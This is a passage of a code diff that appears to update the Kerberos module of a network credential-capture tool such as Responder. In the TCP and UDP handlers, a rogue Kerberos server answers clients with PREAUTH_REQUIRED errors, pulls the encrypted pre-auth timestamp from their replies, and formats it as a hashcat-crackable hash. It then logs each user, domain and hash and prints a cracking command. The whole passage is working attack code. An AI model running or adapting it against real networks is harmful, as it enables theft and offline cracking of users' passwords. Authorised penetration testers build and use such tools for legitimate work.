+				has_padata, etype = find_padata_and_etype(data)
 				
-				# Add TCP length prefix (4 bytes)
-				tcp_length = struct.pack('>I', len(krb_error))
-				response = tcp_length + krb_error
-				
-				self.request.send(response)
-				
+				if has_padata and etype:
+					# Client sent pre-auth data - extract the encrypted timestamp
+					etype_num, cipher_hex = extract_encrypted_timestamp(data)
+					
+					if etype_num and cipher_hex:
+						etype_name = ENCRYPTION_TYPES.get(bytes([etype_num]), 'unknown')
+						
+						if settings.Config.Verbose:
+							print(color('[KERB] AS-REQ with PA-ENC-TIMESTAMP from %s@%s (etype: %s)' % (cname, realm, etype_name), 3, 1))
+						
+						# Build the hash in hashcat format
+						if etype_num == 0x17 or etype_num == 0x18:  # RC4 (23 = 0x17, 24 = 0x18)
+							# RC4 format: $krb5pa$23$user$realm$dummy$hash
+							# Flip: last 36 bytes + first 16 bytes (per Responder's ParseMSKerbv5TCP)
+							
+							if len(cipher_hex) >= 32:
+								first_16_bytes = cipher_hex[0:32]   # First 16 bytes
+								rest = cipher_hex[32:]               # Rest (36 bytes)
+								flipped_hash = rest + first_16_bytes
+								hash_value = '$krb5pa$23$%s$%s$dummy$%s' % (cname, realm, flipped_hash)
+							else:
+								hash_value = '$krb5pa$23$%s$%s$dummy$%s' % (cname, realm, cipher_hex)
+								
+						elif etype_num == 0x12:  # AES256 (18)
+							checksum = cipher_hex[-24:]
+							salt = realm + cname
+							hash_value = '$krb5pa$18$%s$%s$%s$%s$%s' % (cname, realm, salt, cipher_hex, checksum)
+						elif etype_num == 0x11:  # AES128 (17)
+							checksum = cipher_hex[-24:]
+							salt = realm + cname
+							hash_value = '$krb5pa$17$%s$%s$%s$%s$%s' % (cname, realm, salt, cipher_hex, checksum)
+						else:
+							hash_value = '$krb5pa$%d$%s$%s$%s' % (etype_num, cname, realm, cipher_hex)
+						
+						# Log to database
+						SaveToDb({
+							'module': 'Kerberos',
+							'type': 'AS-REQ',
+							'client': self.client_address[0],
+							'user': cname,
+							'domain': realm,
+							'hash': hash_value,
+							'fullhash': hash_value
+						})
+						
+						# Print the hash
+						print(text('[KERB] Use hashcat -m 7500 (etype %d): %s' % (etype_num, hash_value)))
+					else:
+						if settings.Config.Verbose:
+							print(color('[KERB] AS-REQ with PA-DATA but could not extract hash from %s@%s' % (cname, realm), 1, 1))
+				else:
+					# First AS-REQ without pre-auth - send KRB-ERROR requiring pre-auth
+					if settings.Config.Verbose:
+						print(color('[KERB] AS-REQ from %s@%s - sending PREAUTH_REQUIRED' % (cname, realm), 2, 1))
+					
+					# Build KRB-ERROR response
+					krb_error = build_krb_error(realm, cname)
+					
+					# Send with Record Mark
+					response = struct.pack('>I', len(krb_error)) + krb_error
+					self.request.sendall(response)
+					
+					if settings.Config.Verbose:
+						print(color('[KERB] Sent KRB-ERROR (PREAUTH_REQUIRED) to %s' % self.client_address[0], 2, 1))
+			
+			elif msg_type == 12:  # TGS-REQ
 				if settings.Config.Verbose:
-					print(text('[KERB] TCP sent KRB-ERROR (service unknown) to force AS-REQ from %s' % 
-						self.client_address[0].replace("::ffff:", "")))
-			
-			elif error_code == 20:
-				# Send KRB-ERROR to invalidate TGT (TGS-REQ received)
-				krb_error = build_krb_error(20, cname, realm)
-				
-				# Add TCP length prefix (4 bytes)
-				tcp_length = struct.pack('>I', len(krb_error))
-				response = tcp_length + krb_error
-				
-				self.request.send(response)
-				
-				if settings.Config.Verbose:
-					print(text('[KERB] TCP sent KRB-ERROR (TGT revoked) to force AS-REQ from %s' % 
-						self.client_address[0].replace("::ffff:", "")))
-			
-			elif settings.Config.Verbose:
-				print(text('[KERB] TCP no hash captured from %s' % 
-					self.client_address[0].replace("::ffff:", "")))
+					print(text('[KERB] TGS-REQ from %s@%s (ignoring)' % (cname, realm)))
 		
 		except Exception as e:
 			if settings.Config.Verbose:
-				print(text('[KERB] TCP exception: %s' % str(e)))
+				print(text('[KERB] Error: %s' % str(e)))
 
 class KerbUDP(BaseRequestHandler):
-	"""Kerberos UDP handler with RC4 and AES support"""
+	"""Kerberos UDP handler (port 88)"""
 	
 	def handle(self):
 		try:
-			data, soc = self.request
+			data, socket_obj = self.request
 			
-			if not data:
+			# Parse Kerberos message
+			msg_type, valid, cname, realm = find_msg_type(data)
+			
+			if not valid:
+				if settings.Config.Verbose:
+					print(text('[KERB] Invalid Kerberos message'))
 				return
 			
-			if settings.Config.Verbose:
-				print(text('[KERB] UDP packet from %s, size: %d bytes' % (
-					self.client_address[0].replace("::ffff:", ""), len(data))))
+			if msg_type == 10:  # AS-REQ
+				# Check if client sent PA-DATA
+				has_padata, etype = find_padata_and_etype(data)
+				
+				if has_padata and etype:
+					# Client sent pre-auth data - extract the encrypted timestamp
+					etype_num, cipher_hex = extract_encrypted_timestamp(data)
+					
+					if etype_num and cipher_hex:
+						etype_name = ENCRYPTION_TYPES.get(bytes([etype_num]), 'unknown')
+						
+						if settings.Config.Verbose:
+							print(color('[KERB] AS-REQ with PA-ENC-TIMESTAMP from %s@%s (etype: %s)' % (cname, realm, etype_name), 3, 1))
+						
+						# Build the hash in hashcat format
+						if etype_num == 0x17 or etype_num == 0x18:  # RC4 (23 = 0x17, 24 = 0x18)
+							if len(cipher_hex) >= 32:
+								first_16_bytes = cipher_hex[0:32]
+								rest = cipher_hex[32:]
+								flipped_hash = rest + first_16_bytes
+								hash_value = '$krb5pa$23$%s$%s$dummy$%s' % (cname, realm, flipped_hash)
+							else:
+								hash_value = '$krb5pa$23$%s$%s$dummy$%s' % (cname, realm, cipher_hex)
+								
+						elif etype_num == 0x12:  # AES256 (18)
+							checksum = cipher_hex[-24:]
+							salt = realm + cname
+							hash_value = '$krb5pa$18$%s$%s$%s$%s$%s' % (cname, realm, salt, cipher_hex, checksum)
+						elif etype_num == 0x11:  # AES128 (17)
+							checksum = cipher_hex[-24:]
+							salt = realm + cname
+							hash_value = '$krb5pa$17$%s$%s$%s$%s$%s' % (cname, realm, salt, cipher_hex, checksum)
+						else:
+							hash_value = '$krb5pa$%d$%s$%s$%s' % (etype_num, cname, realm, cipher_hex)
+						
+						# Log to database
+						SaveToDb({
+							'module': 'Kerberos',
+							'type': 'AS-REQ',
+							'client': self.client_address[0],
+							'user': cname,
+							'domain': realm,
+							'hash': hash_value,
+							'fullhash': hash_value
+						})
+						
+						# Print the hash
+						print(color('[KERB] Kerberos 5 AS-REQ (etype %d): %s' % (etype_num, hash_value), 3, 1))
+					else:
+						if settings.Config.Verbose:
+							print(color('[KERB] AS-REQ with PA-DATA but could not extract hash from %s@%s' % (cname, realm), 1, 1))
+				else:
+					# First AS-REQ without pre-auth - send KRB-ERROR requiring pre-auth
+					if settings.Config.Verbose:
+						print(color('[KERB] AS-REQ from %s@%s - sending PREAUTH_REQUIRED' % (cname, realm), 2, 1))
+					
+					# Build KRB-ERROR response
+					krb_error = build_krb_error(realm, cname)
+					
+					# Send directly (no Record Mark for UDP)
+					socket_obj.sendto(krb_error, self.client_address)
+					
+					if settings.Config.Verbose:
+						print(color('[KERB] Sent KRB-ERROR (PREAUTH_REQUIRED) to %s' % self.client_address[0], 2, 1))
 			
-			result, error_code, cname, realm = ParseMSKerbv5UDP(data)
-			
-			if result:
-				# Got hash!
-				KerbHash = result['hash']
-				name = result['name']
-				domain = result['domain']
-				enc_type = result['enc_type']
-				
-				parts = KerbHash.split('$')
-				hash_value = parts[6] if len(parts) >= 7 else parts[5] if len(parts) >= 6 else ''
-				
-				SaveToDb({
-					'module': 'KERB',
-					'type': 'MSKerbv5',
-					'client': self.client_address[0],
-					'user': domain + '\\' + name,
-					'hash': hash_value,
-					'fullhash': KerbHash,
-				})
-				
-				hashcat_mode = '19900' if 'aes' in enc_type else '13100'
-				print(color("[*] [KERB] UDP %s hash captured from %s for user %s\\%s (hashcat -m %s)" % (
-					enc_type,
-					self.client_address[0].replace("::ffff:", ""), 
-					domain, 
-					name,
-					hashcat_mode
-				), 3, 1))
-			
-			elif error_code == 25:
-				# Send KRB-ERROR to request pre-authentication
-				krb_error = build_krb_error(25, cname, realm)
-				
-				soc.sendto(krb_error, self.client_address)
-				
+			elif msg_type == 12:  # TGS-REQ
 				if settings.Config.Verbose:
-					print(text('[KERB] UDP sent KRB-ERROR (pre-auth required) to %s' % 
-						self.client_address[0].replace("::ffff:", "")))
-			
-			elif error_code == 7:
-				# Send KRB-ERROR to force re-authentication (TGS-REQ received)
-				krb_error = build_krb_error(7, cname, realm)
-				
-				soc.sendto(krb_error, self.client_address)
-				
-				if settings.Config.Verbose:
-					print(text('[KERB] UDP sent KRB-ERROR (service unknown) to force AS-REQ from %s' % 
-						self.client_address[0].replace("::ffff:", "")))
-			
-			elif error_code == 20:
-				# Send KRB-ERROR to invalidate TGT (TGS-REQ received)
-				krb_error = build_krb_error(20, cname, realm)
-				
-				soc.sendto(krb_error, self.client_address)
-				
-				if settings.Config.Verbose:
-					print(text('[KERB] UDP sent KRB-ERROR (TGT revoked) to force AS-REQ from %s' % 
-						self.client_address[0].replace("::ffff:", "")))
-			
-			elif settings.Config.Verbose:
-				print(text('[KERB] UDP no hash captured from %s' % 
-					self.client_address[0].replace("::ffff:", "")))
+					print(text('[KERB] TGS-REQ from %s@%s (ignoring)' % (cname, realm)))
 		
 		except Exception as e:
 			if settings.Config.Verbose:
-				print(text('[KERB] UDP exception: %s' % str(e)))
+				print(text('[KERB] Error: %s' % str(e)))
